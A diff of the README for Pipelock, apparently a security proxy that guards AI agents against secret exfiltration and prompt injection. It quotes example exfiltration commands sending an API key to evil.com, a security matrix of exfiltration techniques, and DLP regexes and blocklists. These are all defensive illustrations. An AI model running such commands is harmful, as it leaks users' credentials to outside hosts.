@@ -1,36 +1,78 @@
 <p align="center">
-  <img src="assets/logo.jpg" alt="Pipelock" width="200">
+  <img src="assets/pipelock-logo.svg" alt="Pipelock" width="200">
 </p>
 
 # Pipelock
 
 [![CI](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml)
 [![Go Report Card](https://goreportcard.com/badge/github.com/luckyPipewrench/pipelock)](https://goreportcard.com/report/github.com/luckyPipewrench/pipelock)
-[![CodeQL](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml)
+[![GitHub Release](https://img.shields.io/github/v/release/luckyPipewrench/pipelock)](https://github.com/luckyPipewrench/pipelock/releases)
 [![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge)](https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock)
 [![OpenSSF Best Practices](https://www.bestpractices.dev/projects/11948/badge)](https://www.bestpractices.dev/projects/11948)
 [![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
 [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
 
-**All-in-one security harness for AI agents.** Single static binary, no runtime dependencies. Controls network egress, detects credential exfiltration, scans for prompt injection, and monitors workspace integrity.
+**Security harness for AI agents.** Single binary, zero runtime dependencies.
 
-If you run Claude Code, OpenHands, or any AI agent with shell access and API keys, this is for you.
+Your agent has `$ANTHROPIC_API_KEY` in its environment — and shell access. One request is all it takes:
 
-[Blog](https://pipelab.org/blog/) | [OWASP Coverage](docs/owasp-mapping.md) | [Tool Comparison](docs/comparison.md)
-
-> If Pipelock is useful, a [star](https://github.com/luckyPipewrench/pipelock) helps others find it.
-
-[![demo](https://asciinema.org/a/I1UzzECkeCBx6p42.svg)](https://asciinema.org/a/I1UzzECkeCBx6p42)
-
-## The Problem
-
-AI agents run with shell access, API keys in environment, and unrestricted internet. A compromised agent can exfiltrate secrets with one HTTP request:
-
-```
-curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over
+```bash
+curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over — unless pipelock is watching
 ```
 
-## The Solution
+**Works with:** Claude Code · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph · Cursor
+
+[Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/)
+
+![Pipelock demo — DLP blocking, domain blocklist, integrity monitoring](assets/demo.gif)
+
+## Quick Start
+
+```bash
+# macOS / Linux
+brew install luckyPipewrench/tap/pipelock
+
+# Or download a binary (no dependencies)
+# See https://github.com/luckyPipewrench/pipelock/releases
+
+# Or with Docker
+docker pull ghcr.io/luckypipewrench/pipelock:latest
+
+# Or from source (requires Go 1.24+)
+go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
+```
+
+Then:
+
+```bash
+# Scan your project and generate a tailored config
+pipelock audit . -o pipelock-suggested.yaml
+# Review the output, then rename when ready:
+mv pipelock-suggested.yaml pipelock.yaml
+
+# Verify: this should be blocked (exit code 1 = working correctly)
+pipelock check --config pipelock.yaml --url "https://pastebin.com/raw/abc123"
+
+# When ready, start the proxy (agents connect to localhost:8888)
+pipelock run --config pipelock.yaml
+```
+
+<details>
+<summary>Verify release integrity (SLSA provenance + SBOM)</summary>
+
+Every release includes SLSA build provenance and an SBOM (CycloneDX). Verify with the GitHub CLI:
+
+```bash
+# Verify a downloaded binary
+gh attestation verify pipelock_*_linux_amd64.tar.gz --owner luckyPipewrench
+
+# Verify the container image (substitute the release version)
+gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner luckyPipewrench
+```
+
+</details>
+
+## How It Works
 
 Pipelock uses **capability separation** — the agent process (which has secrets) is network-restricted, while a separate fetch proxy (which has NO secrets) handles web browsing. Every request goes through a 9-layer scanner pipeline.
 
@@ -91,74 +133,20 @@ flowchart LR
 | Workspace integrity monitoring | Yes | No | No | Partial |
 | MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
 | MCP HTTP transport (Streamable HTTP) | Yes | No | No | No |
-| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel modules) |
+| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel-level enforcement) |
 | Audit logging + Prometheus | Yes | No | No | No |
 
 Full comparison: [docs/comparison.md](docs/comparison.md)
 
-## Quick Start
+## Security Matrix
 
-```bash
-# Install (requires Go 1.24+)
-go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
-
-# Scan your project and generate a tailored config
-pipelock audit . -o pipelock.yaml
-
-# Start the proxy
-pipelock run --config pipelock.yaml
-
-# Test: this should be blocked
-pipelock check --url "https://pastebin.com/raw/abc123"
-```
-
-Or with Docker:
-
-```bash
-docker pull ghcr.io/luckypipewrench/pipelock:latest
-docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
-  ghcr.io/luckypipewrench/pipelock:latest \
-  run --config /config/pipelock.yaml --listen 0.0.0.0:8888
-```
-
-### Verify Release Integrity
-
-Every release includes SLSA build provenance and an SBOM (CycloneDX). Verify with the GitHub CLI:
-
-```bash
-# Verify a downloaded binary
-gh attestation verify pipelock_*_linux_amd64.tar.gz --owner luckyPipewrench
-
-# Verify the container image (substitute the release version)
-gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner luckyPipewrench
-```
-
-## OWASP Agentic Top 10 Coverage
-
-| Threat | Coverage |
-|--------|----------|
-| ASI01 Agent Goal Hijack | **Strong** - bidirectional MCP + response scanning |
-| ASI02 Tool Misuse | **Partial** - proxy as controlled tool, MCP scanning |
-| ASI03 Identity & Privilege Abuse | **Strong** - capability separation + SSRF protection |
-| ASI04 Supply Chain Vulnerabilities | **Partial** - integrity monitoring + MCP scanning |
-| ASI05 Unexpected Code Execution | **Moderate** - HITL approval, fail-closed defaults |
-| ASI06 Memory & Context Poisoning | **Moderate** - injection detection on fetched content |
-| ASI07 Insecure Inter-Agent Communication | **Partial** - agent ID, integrity, signing |
-| ASI08 Cascading Failures | **Moderate** - fail-closed architecture, rate limiting |
-| ASI09 Human-Agent Trust Exploitation | **Partial** - HITL modes, audit logging |
-| ASI10 Rogue Agents | **Strong** - domain allowlist + rate limiting + capability separation |
-
-Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)
-
-## Three Modes
+Pipelock runs in three modes:
 
 | Mode | Security | Web Browsing | Use Case |
 |------|----------|--------------|----------|
 | **strict** | Airtight | None | Regulated industries, high-security |
 | **balanced** | Blocks naive + detects sophisticated | Via fetch proxy | Most developers (default) |
 | **audit** | Logging only | Unrestricted | Evaluation before enforcement |
-
-## Security Matrix
 
 What each mode prevents, detects, or logs:
 
@@ -167,11 +155,11 @@ What each mode prevents, detects, or logs:
 | `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
 | Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
 | Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
-| DNS tunneling | **Prevented** | **Prevented** (restricted DNS) | Logged |
-| Chunked exfiltration | **Prevented** | **Detected** (rate limiting) | Logged |
+| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
+| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
 | Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |
 
-> **Honest assessment:** Strict mode provides mathematical certainty. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today.
+> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains — no web browsing means no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today.
 
 ## Features
 
@@ -191,7 +179,7 @@ The fetch proxy runs a 9-layer scanner pipeline on every request:
 
 1. **Scheme validation** — enforces http/https only
 2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh). Pre-DNS.
-3. **DLP patterns** — regex matching for API keys, tokens, and secrets (includes env variable leak detection: raw + base64, values 16+ chars with entropy > 3.0). Pre-DNS to prevent secret exfiltration via DNS queries.
+3. **DLP patterns** — regex matching for API keys, tokens, and secrets. Includes env variable leak detection (values 16+ chars with entropy > 3.0, raw + base64/hex/base32 encoded) and known-secret file scanning (raw + encoded forms). Pre-DNS to prevent secret exfiltration via DNS queries.
 4. **Path entropy analysis** — Shannon entropy flags encoded/encrypted data in URL path segments
 5. **Subdomain entropy analysis** — flags high-entropy subdomains used for DNS exfiltration
 6. **SSRF protection** — blocks internal/private IPs with DNS rebinding prevention. Post-DNS, safe after DLP.
@@ -258,6 +246,26 @@ pipelock mcp scan --json --config pipelock.yaml < responses.jsonl
 
 Catches injection split across content blocks. Exit 0 if clean, 1 if injection detected.
 
+### MCP Tool Call Policy
+
+Define rules to block or warn before specific tool calls reach MCP servers:
+
+```yaml
+mcp_tool_policy:
+  enabled: true
+  action: warn
+  rules:
+    - name: "Block shell execution"
+      tool_pattern: "execute_command|run_terminal"
+      action: block
+    - name: "Warn on sensitive writes"
+      tool_pattern: "write_file"
+      arg_pattern: '/etc/.*|/usr/.*'
+      action: warn
+```
+
+Auto-enabled in proxy mode. Rules are evaluated before tool calls are forwarded.
+
 ### Multi-Agent Support
 
 Each agent identifies itself via `X-Pipelock-Agent` header (or `?agent=` query parameter). All audit logs include the agent name for per-agent filtering.
@@ -294,6 +302,7 @@ fetch_proxy:
 
 dlp:
   scan_env: true
+  secrets_file: "./known-secrets.txt"  # optional: one secret per line, scanned in raw + encoded forms
   patterns:
     - name: "Anthropic API Key"
       regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}'
@@ -301,6 +310,7 @@ dlp:
     - name: "AWS Access Key"
       regex: 'AKIA[0-9A-Z]{16}'
       severity: critical
+    # ... 13 more patterns ship by default (see configs/balanced.yaml)
 
 response_scanning:
   enabled: true
@@ -319,6 +329,11 @@ mcp_tool_scanning:
   action: warn               # block or warn (auto-enabled for mcp proxy)
   detect_drift: true         # alert on tool description changes mid-session
 
+# mcp_tool_policy:           # pre-execution tool call policy (see "MCP Tool Call Policy" above)
+#   enabled: true
+#   action: warn
+#   rules: []
+
 logging:
   format: json
   output: stdout
@@ -326,8 +341,10 @@ logging:
   include_blocked: true
 
 internal:
+  - "0.0.0.0/8"
   - "127.0.0.0/8"
   - "10.0.0.0/8"
+  - "100.64.0.0/10"
   - "172.16.0.0/12"
   - "192.168.0.0/16"
   - "169.254.0.0/16"
@@ -392,7 +409,9 @@ jobs:
 ```bash
 # Pull from GHCR
 docker pull ghcr.io/luckypipewrench/pipelock:latest
-docker run -p 8888:8888 ghcr.io/luckypipewrench/pipelock:latest
+docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
+  ghcr.io/luckypipewrench/pipelock:latest \
+  run --config /config/pipelock.yaml --listen 0.0.0.0:8888
 
 # Build locally
 docker build -t pipelock .
@@ -405,10 +424,8 @@ docker compose up
 
 The generated compose file creates two containers: **pipelock** (fetch proxy with internet) and **agent** (your AI agent on an internal-only network, can only reach pipelock).
 
-## API Reference
-
 <details>
-<summary>Fetch proxy endpoints</summary>
+<summary>API Reference</summary>
 
 ```bash
 # Fetch a URL (returns extracted text content)
@@ -444,7 +461,7 @@ curl "http://localhost:8888/stats"
   "version": "x.y.z",
   "mode": "balanced",
   "uptime_seconds": 3600.5,
-  "dlp_patterns": 8,
+  "dlp_patterns": 15,
   "response_scan_enabled": true,
   "git_protection_enabled": false,
   "rate_limit_enabled": true
@@ -474,16 +491,25 @@ curl "http://localhost:8888/stats"
 
 </details>
 
-## Building
+<details>
+<summary>OWASP Agentic Top 10 Coverage</summary>
 
-```bash
-make build    # Build with version metadata
-make test     # Run tests
-make lint     # Lint
-make docker   # Build Docker image
-```
+| Threat | Coverage |
+|--------|----------|
+| ASI01 Agent Goal Hijack | **Strong** - bidirectional MCP + response scanning |
+| ASI02 Tool Misuse | **Partial** - proxy as controlled tool, MCP scanning |
+| ASI03 Identity & Privilege Abuse | **Strong** - capability separation + SSRF protection |
+| ASI04 Supply Chain Vulnerabilities | **Partial** - integrity monitoring + MCP scanning |
+| ASI05 Unexpected Code Execution | **Moderate** - HITL approval, fail-closed defaults |
+| ASI06 Memory & Context Poisoning | **Moderate** - injection detection on fetched content |
+| ASI07 Insecure Inter-Agent Communication | **Partial** - agent ID, integrity, signing |
+| ASI08 Cascading Failures | **Moderate** - fail-closed architecture, rate limiting |
+| ASI09 Human-Agent Trust Exploitation | **Partial** - HITL modes, audit logging |
+| ASI10 Rogue Agents | **Strong** - domain allowlist + rate limiting + capability separation |
 
-## Project Structure
+Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)
+
+</details>
 
 ```
 cmd/pipelock/          CLI entry point
@@ -511,6 +537,8 @@ blog/                  Blog posts (mirrored at pipelab.org/blog/)
 - Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
 - See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to [AIP](https://github.com/ArangoGutierrez/agent-identity-protocol), [agentsh](https://github.com/canyonroad/agentsh), and [srt](https://github.com/anthropic-experimental/sandbox-runtime)
 - Security review contributions from Dylan Corrales
+
+If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock) — it helps others find the project.
 
 ## License
 
